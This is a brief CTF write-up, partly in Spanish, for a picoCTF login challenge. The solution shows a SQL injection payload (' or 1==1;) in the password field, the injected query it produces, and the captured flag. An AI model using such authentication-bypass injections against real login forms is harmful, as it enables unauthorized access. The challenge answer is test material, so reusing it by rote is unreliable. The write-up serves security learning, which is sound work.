## Descripción 

Do you think you can log us in? Try to see if you can login!http://fickle-tempest.picoctf.net:64992.
## Solución 
```
username: admin
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_85832275}
```